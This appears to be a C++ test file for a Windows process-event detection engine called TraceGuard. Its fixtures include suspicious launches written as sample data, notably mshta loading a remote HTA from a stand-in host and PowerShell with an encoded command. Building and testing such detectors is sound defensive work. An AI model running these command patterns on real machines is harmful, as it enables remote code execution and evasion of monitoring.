#include "traceguard/jsonl.hpp"
#include "traceguard/rule_engine.hpp"

#include <iostream>
#include <string>
#include <vector>

namespace {

int failures = 0;

void Expect(bool condition, const char* message) {
    if (!condition) {
        ++failures;
        std::cerr << "FAIL: " << message << '\n';
    }
}

bool HasRule(const std::vector<traceguard::Finding>& findings, const std::string& id) {
    for (const auto& f : findings) if (f.rule_id == id) return true;
    return false;
}

void TestUserWritableExecution() {
    traceguard::RuleEngine engine;
    traceguard::Event e;
    e.timestamp_utc = "2026-09-06T12:00:00.000Z";
    e.kind = traceguard::EventKind::ProcessStart;
    e.pid = 100;
    e.image = R"(C:\Users\alice\AppData\Local\Temp\helper.exe)";
    Expect(HasRule(engine.Evaluate(e), "TG1001"), "TG1001 should detect user-writable execution");
}

void TestOfficeSpawnsPowerShell() {
    traceguard::RuleEngine engine;
    traceguard::Event e;
    e.kind = traceguard::EventKind::ProcessStart;
    e.pid = 101;
    e.ppid = 55;
    e.image = R"(C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe)";
    e.parent_image = R"(C:\Program Files\Microsoft Office\root\Office16\WINWORD.EXE)";
    e.command_line = "powershell.exe -NoProfile";
    Expect(HasRule(engine.Evaluate(e), "TG1002"), "TG1002 should detect Office -> PowerShell");
}

void TestEncodedPowerShell() {
    traceguard::RuleEngine engine;
    traceguard::Event e;
    e.kind = traceguard::EventKind::ProcessStart;
    e.pid = 102;
    e.image = R"(C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe)";
    e.command_line = "powershell.exe -EncodedCommand AAAA";
    Expect(HasRule(engine.Evaluate(e), "TG1003"), "TG1003 should detect encoded PowerShell");
}

void TestRemoteMshta() {
    traceguard::RuleEngine engine;
    traceguard::Event e;
    e.kind = traceguard::EventKind::ProcessStart;
    e.pid = 103;
    e.image = R"(C:\Windows\System32\mshta.exe)";
    e.command_line = "mshta.exe https://example.invalid/demo.hta";
    Expect(HasRule(engine.Evaluate(e), "TG1004"), "TG1004 should detect remote MSHTA");
}

void TestBenignNotepad() {
    traceguard::RuleEngine engine;
    traceguard::Event e;
    e.kind = traceguard::EventKind::ProcessStart;
    e.pid = 104;
    e.image = R"(C:\Windows\System32\notepad.exe)";
    e.parent_image = R"(C:\Windows\explorer.exe)";
    e.command_line = "notepad.exe";
    Expect(engine.Evaluate(e).empty(), "notepad launched by explorer should not match v1 rules");
}

void TestJsonRoundTrip() {
    traceguard::Event e;
    e.timestamp_utc = "2026-09-06T12:00:03.000Z";
    e.kind = traceguard::EventKind::ProcessStart;
    e.pid = 105;
    e.ppid = 42;
    e.event_id = 1;
    e.opcode = 1;
    e.provider = "Microsoft-Windows-Kernel-Process";
    e.image = R"(C:\Windows\System32\cmd.exe)";
    e.command_line = "cmd.exe /c echo \"hello\"";

    const auto parsed = traceguard::ParseEventJsonLine(traceguard::EventToJson(e));
    Expect(parsed.has_value(), "serialized event should parse");
    if (parsed) {
        Expect(parsed->pid == e.pid, "pid should round-trip");
        Expect(parsed->ppid == e.ppid, "ppid should round-trip");
        Expect(parsed->image == e.image, "image should round-trip");
        Expect(parsed->command_line == e.command_line, "command line should round-trip");
    }
}

void TestParentCorrelation() {
    traceguard::RuleEngine engine;
    traceguard::Event parent;
    parent.kind = traceguard::EventKind::ProcessStart;
    parent.pid = 500;
    parent.image = R"(C:\Program Files\Microsoft Office\root\Office16\WINWORD.EXE)";
    engine.Evaluate(parent);

    traceguard::Event child;
    child.kind = traceguard::EventKind::ProcessStart;
    child.pid = 501;
    child.ppid = 500;
    child.image = R"(C:\Windows\System32\cmd.exe)";
    Expect(HasRule(engine.Evaluate(child), "TG1002"), "engine should correlate known parent image by PPID");
}

} // namespace

int main() {
    TestUserWritableExecution();
    TestOfficeSpawnsPowerShell();
    TestEncodedPowerShell();
    TestRemoteMshta();
    TestBenignNotepad();
    TestJsonRoundTrip();
    TestParentCorrelation();

    if (failures == 0) {
        std::cout << "All TraceGuard core tests passed.\n";
        return 0;
    }
    std::cerr << failures << " test(s) failed.\n";
    return 1;
}
